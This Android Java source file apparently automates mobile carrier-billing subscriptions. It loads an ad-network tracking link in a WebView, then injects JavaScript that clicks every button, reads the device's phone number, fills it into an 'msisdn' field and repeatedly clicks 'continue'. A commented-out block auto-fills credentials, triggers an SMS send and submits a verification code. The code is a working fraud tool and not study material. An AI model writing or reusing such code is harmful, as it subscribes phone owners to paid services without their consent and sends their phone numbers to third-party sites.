package moziqi.interviewdemo.subscribe;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.widget.Button;
import android.widget.Toast;

import moziqi.interviewdemo.R;
import moziqi.interviewdemo.util.LogUtils;
import moziqi.interviewdemo.util.TouchUtils;
import moziqi.interviewdemo.webview.SimulationListener;
import moziqi.interviewdemo.webview.TouchWebView;

public class SubscribeActivity extends AppCompatActivity {

    private Button mGetPhone;

    private Button mGetMsg;

    private TouchWebView mTouchWebView;

    private TouchUtils touchUtils = new TouchUtils();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_subscribe);

        getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        getSupportActionBar().setHomeButtonEnabled(true);


        mGetPhone = findViewById(R.id.getPhone);
        mGetMsg = findViewById(R.id.getMsg);
        mTouchWebView = findViewById(R.id.touchWebView);

        mTouchWebView.loadURL("http://clickmob.c0c.xyz/rest/ck/o/1245/2387042?");
//        mTouchWebView.loadURL("http://smobi.fuse-ad.com/tl?a=3&o=59");
        mTouchWebView.setSimulationListener(new SimulationListener() {
            @Override
            public void doSimulation() {
            }

            @Override
            public void onPageFinished(String url) {
                //在这个方法处理
                if (handler.hasMessages(1)) {
                    handler.removeMessages(1);
                }
                handler.sendEmptyMessageDelayed(1, 3000);
                //这是二次点击处理
                if (handler.hasMessages(2)) {
                    handler.removeMessages(2);
                }
                handler.sendEmptyMessageDelayed(2, 15 * 1000);
            }

            @Override
            public void onError(String url) {

            }
        });
    }


    private Handler handler = new Handler(Looper.getMainLooper()) {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            LogUtils.i("mo", String.format("msg.what>>%d", msg.what));
            switch (msg.what) {
                case 1:
                    mTouchWebView.loadJs("javascript:for(var i=0;i<document.getElementsByName('button').length;i++){document.getElementsByName('button')[i].click();}");
                    break;
                case 2:
                    //这里还有类型Operatore、TIM、Vodafone、Wind
                    //获取输入框，填充电话号码
                    //msisdn
                    String phoneNum = PhoneUtils.getPhoneNum(getApplicationContext());
                    String result = TextUtils.isEmpty(phoneNum) ? "13580889531" : phoneNum;
                    mTouchWebView.loadJs("javascript:document.getElementById('msisdn').focus()");
                    mTouchWebView.loadJs("javascript:document.getElementsByClassName('inputbox')[0].focus()");
                    mTouchWebView.loadJs(
                            String.format("javascript:document.getElementById('msisdn').value='%1s';document.getElementsByClassName('inputbox')[0].value='%2s';",
                                    result, result)
                    );
                    handler.sendEmptyMessageDelayed(3, 5000);
                    break;
                case 3:
                    mTouchWebView.loadJs("javascript:document.getElementsByClassName('continue')[0].click()");
                    handler.sendEmptyMessageDelayed(3, 5000);
                    break;
                case 4:
                    break;
                case 5:
                    break;
                case 6:
                    break;
                case 7:
                    while (mTouchWebView.canGoBack()) {
                        mTouchWebView.goBack();
                    }
                    break;
                case 8:
                    mTouchWebView.reload();
                    break;
            }
        }
    };

    @Override
    public void onBackPressed() {
        if (mTouchWebView != null) {
            //如果h5页面可能返回，跳转到上个页面
            if (mTouchWebView.canGoBack()) {
                mTouchWebView.goBack();
            } else {
                //不能返回上个页面，直接finish当前Activity
                finish();
            }
        } else {
            finish();
        }
    }

//    private Handler handler = new Handler(Looper.getMainLooper()) {
//        @Override
//        public void handleMessage(Message msg) {
//            super.handleMessage(msg);
//            LogUtils.i("mo", String.format("msg.what>>%d", msg.what));
//            switch (msg.what) {
//                case 1:
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('nickname').focus()");
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('nickname').value=\"测试人员\"");
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('password').focus()");
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('password').value=\"tmd123456\"");
//
//                    handler.sendEmptyMessageDelayed(2, 5000);
//                    break;
//                case 2:
//                    String phoneNum = PhoneUtils.getPhoneNum(getApplicationContext());
//
//                    mTouchWebView.loadJs("javascript:document.getElementsByClassName('phone')[0].focus()");
//
//                    mTouchWebView.loadJs(
//                            String.format("javascript:document.getElementsByClassName('phone')[0].value=\"%s\"",
//                                    TextUtils.isEmpty(phoneNum) ? "13580889531" : phoneNum)
//                    );
//
//                    mTouchWebView.loadJs("javascript:document.getElementsByClassName('phone')[0].focus()");
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('nickname').focus()");
//
//                    handler.sendEmptyMessageDelayed(3, 5000);
//                    break;
//                case 3:
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('nickname').focus()");
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('send-sms').click()");
//
//                    handler.sendEmptyMessageDelayed(4, 5000);
//                    break;
//                case 4:
//                    mTouchWebView.loadJs("javascript:document.getElementById('code').focus()");
//
//                    mTouchWebView.loadJs("javascript:document.getElementById('code').value=\"112312\"");
//
//                    //刷新焦点
//                    mTouchWebView.loadJs("javascript:document.getElementById('nickname').focus()");
//
//                    handler.sendEmptyMessageDelayed(5, 5000);
//                    break;
//                case 5:
//
//                    //刷新焦点
//                    mTouchWebView.loadJs("javascript:document.getElementById('nickname').focus()");
//
//                    mTouchWebView.loadJs("javascript:document.getElementsByClassName('submit')[0].click()");
//                    Toast.makeText(getApplicationContext(), "点击了提交", Toast.LENGTH_SHORT).show();
//                    break;
//                case 6:
//                    break;
//                case 7:
//                    while (mTouchWebView.canGoBack()) {
//                        mTouchWebView.goBack();
//                    }
//                    break;
//                case 8:
//                    mTouchWebView.reload();
//                    break;
//            }
//        }
//    };
}
